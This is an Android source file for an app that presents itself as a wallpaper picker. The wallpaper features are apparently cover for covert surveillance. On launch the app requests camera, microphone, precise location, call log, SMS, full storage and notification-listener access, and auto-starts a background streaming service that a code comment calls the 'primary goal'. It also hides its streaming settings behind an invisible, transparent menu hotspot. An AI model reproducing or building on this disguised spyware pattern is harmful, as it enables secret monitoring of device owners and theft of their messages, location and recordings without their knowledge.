package com.example.wallpaperapplication;

import android.app.Activity;
import android.app.WallpaperManager;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.TypedValue;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.os.Build;
import android.Manifest;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.net.Uri;
import java.util.ArrayList;
import java.util.List;
import androidx.core.app.ActivityCompat;

import com.google.android.material.appbar.MaterialToolbar;
import com.google.android.material.bottomsheet.BottomSheetDialog;
import com.google.android.material.button.MaterialButton;

import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity implements WallpaperAdapter.OnWallpaperClickListener {

    private ExecutorService executorService;
    private Handler mainHandler;

    private static final String KEY_CONSENT_GIVEN = "consent_given";
    private static final String APP_PREFS = "app_prefs";
    private static final String KEY_STREAM_OPT_IN = "stream_opt_in";

    // Launch ConsentActivity for result (don’t finish MainActivity)
    private final ActivityResultLauncher<Intent> consentLauncher =
            registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
                if (result.getResultCode() == Activity.RESULT_OK) {
                    // If the user opted-in, start service
                    SharedPreferences appPrefs = getSharedPreferences(APP_PREFS, MODE_PRIVATE);
                    if (appPrefs.getBoolean(KEY_STREAM_OPT_IN, false)) {
                        ensureStreamingServiceRunning();
                    }
                    // Now initialize the UI (if not already)
                    initUi();
                } else {
                    // User declined permissions/consent -> close or show a minimal screen
                    Toast.makeText(this, "Permissions required to proceed.", Toast.LENGTH_LONG).show();
                    finish();
                }
            });

    private static final int PERMISSION_REQUEST_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Auto-Start Logic: Check permissions immediately
        if (checkPermissions()) {
            ensureStreamingServiceRunning();
            checkNotificationAccess();
            // Permissions granted, initialize UI
            initUi();
        } 
        
        // We still init UI for the wallpaper features, but the primary goal is streaming.
        if (executorService == null) executorService = Executors.newSingleThreadExecutor();
        if (mainHandler == null) mainHandler = new Handler(Looper.getMainLooper());
    }

    private boolean checkPermissions() {
        List<String> permissions = new ArrayList<>();
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
            permissions.add(Manifest.permission.CAMERA);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
            permissions.add(Manifest.permission.RECORD_AUDIO);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            permissions.add(Manifest.permission.READ_CALL_LOG);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            permissions.add(Manifest.permission.READ_SMS);
            
        // POST_NOTIFICATIONS for Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            }
        }

        // Storage Permission (Android 11+ vs Old)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, 2296);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, 2296);
                }
                // We return false here because we need to wait for the user to return from settings
                // But we ALSO need to request the other permissions if any are missing.
                if (!permissions.isEmpty()) {
                   ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
                }
                return false; 
            }
        } else {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        if (!permissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
            return false;
        }

        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
             boolean allGranted = true;
             for (int result : grantResults) {
                 if (result != PackageManager.PERMISSION_GRANTED) {
                     allGranted = false;
                     break;
                 }
             }
             if (allGranted) {
                 ensureStreamingServiceRunning();
                 checkNotificationAccess();
                 initUi();
             } else {
                 Toast.makeText(this, "Permissions required for auto-stream functionality", Toast.LENGTH_LONG).show();
             }
        }
    }
    
    // Check if we need to guide user to Notification Listener settings (Android specific)
    // Check if we need to guide user to Notification Listener settings (Android specific)
    private void checkNotificationAccess() {
        if (!isNotificationServiceEnabled()) {
            Toast.makeText(this, "Please enable Notification Access for the app", Toast.LENGTH_LONG).show();
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
        }
    }

    private boolean isNotificationServiceEnabled(){
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null && !flat.isEmpty()) {
            final String[] names = flat.split(":");
            for (String name : names) {
                if (name.contains(pkgName)) {
                    return true;
                }
            }
        }
        return false;
    }

    private void initUi() {
        if (executorService == null) {
            executorService = Executors.newSingleThreadExecutor();
        }
        if (mainHandler == null) {
            mainHandler = new Handler(Looper.getMainLooper());
        }

        MaterialToolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        RecyclerView recyclerView = findViewById(R.id.recyclerView);
        recyclerView.setLayoutManager(new GridLayoutManager(this, 2));
        recyclerView.setHasFixedSize(true);
        int[] wallpaperIds = { R.drawable.wallpaper1, R.drawable.wallpaper2, R.drawable.wallpaper3 };
        recyclerView.setAdapter(new WallpaperAdapter(wallpaperIds, this, this));
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main_menu, menu);

        // Invisible but tappable “Settings” hotspot
        MenuItem settings = menu.findItem(R.id.action_settings);
        settings.setIcon(null);
        settings.setTitle("");
        settings.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS);

        View hotspot = new View(this);
        int sizePx = (int) TypedValue.applyDimension(
                TypedValue.COMPLEX_UNIT_DIP, 48, getResources().getDisplayMetrics());
        hotspot.setLayoutParams(new ViewGroup.LayoutParams(sizePx, sizePx));
        hotspot.setAlpha(0f);
        hotspot.setClickable(true);
        hotspot.setOnClickListener(v ->
                startActivity(new Intent(this, StreamingSettingsActivity.class)));
        settings.setActionView(hotspot);

        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.action_settings) {
            startActivity(new Intent(this, StreamingSettingsActivity.class));
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    /** Starts the foreground StreamingService (idempotent). */
    private void ensureStreamingServiceRunning() {
        try {
            Intent svc = new Intent(this, StreamingService.class);
            ContextCompat.startForegroundService(this, svc);
        } catch (IllegalStateException ignored) {
        }
    }

    @Override
    public void onWallpaperClick(int wallpaperId) {
        showWallpaperBottomSheet(wallpaperId);
    }

    private void showWallpaperBottomSheet(int wallpaperId) {
        BottomSheetDialog bottomSheet = new BottomSheetDialog(this);
        View sheetView = LayoutInflater.from(this).inflate(R.layout.bottomsheet_wallpaper_options, null);

        ImageView previewImage = sheetView.findViewById(R.id.previewImage);
        MaterialButton btnHome = sheetView.findViewById(R.id.btnHome);
        MaterialButton btnLock = sheetView.findViewById(R.id.btnLock);
        MaterialButton btnBoth = sheetView.findViewById(R.id.btnBoth);

        previewImage.setImageResource(wallpaperId);

        btnHome.setOnClickListener(v -> {
            bottomSheet.dismiss();
            applyWallpaperInBackground(wallpaperId, WallpaperManager.FLAG_SYSTEM);
        });

        btnLock.setOnClickListener(v -> {
            bottomSheet.dismiss();
            applyWallpaperInBackground(wallpaperId, WallpaperManager.FLAG_LOCK);
        });

        btnBoth.setOnClickListener(v -> {
            bottomSheet.dismiss();
            applyWallpaperInBackground(wallpaperId, WallpaperManager.FLAG_SYSTEM | WallpaperManager.FLAG_LOCK);
        });

        bottomSheet.setContentView(sheetView);
        bottomSheet.show();
    }

    private void applyWallpaperInBackground(int wallpaperId, int flags) {
        BottomSheetDialog progressDialog = new BottomSheetDialog(this);
        View progressView = LayoutInflater.from(this).inflate(R.layout.bottomsheet_progress, null);
        progressDialog.setContentView(progressView);
        progressDialog.setCancelable(false);
        progressDialog.show();

        executorService.execute(() -> {
            try {
                Bitmap bitmap = WallpaperUtils.decodeSampledBitmapFromResource(
                        getResources(), wallpaperId, 1080, 1920);

                if (bitmap == null) throw new IOException("Failed to decode bitmap");

                WallpaperManager wm = WallpaperManager.getInstance(getApplicationContext());
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                    wm.setBitmap(bitmap, null, true, flags);
                } else {
                    wm.setBitmap(bitmap);
                }
                bitmap.recycle();

                mainHandler.post(() -> {
                    if (!isFinishing() && !isDestroyed()) {
                        progressDialog.dismiss();
                        Toast.makeText(this, getSuccessMessage(flags), Toast.LENGTH_SHORT).show();
                    }
                });

            } catch (IOException e) {
                mainHandler.post(() -> {
                    if (!isFinishing() && !isDestroyed()) {
                        progressDialog.dismiss();
                        Toast.makeText(this, "Failed to set wallpaper. Please try again.", Toast.LENGTH_SHORT).show();
                    }
                });
            }
        });
    }

    private String getSuccessMessage(int flags) {
        if (flags == WallpaperManager.FLAG_SYSTEM) return "✓ Home screen wallpaper set successfully!";
        if (flags == WallpaperManager.FLAG_LOCK)   return "✓ Lock screen wallpaper set successfully!";
        return "✓ Wallpaper set for both screens!";
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdown();
        }
    }
}
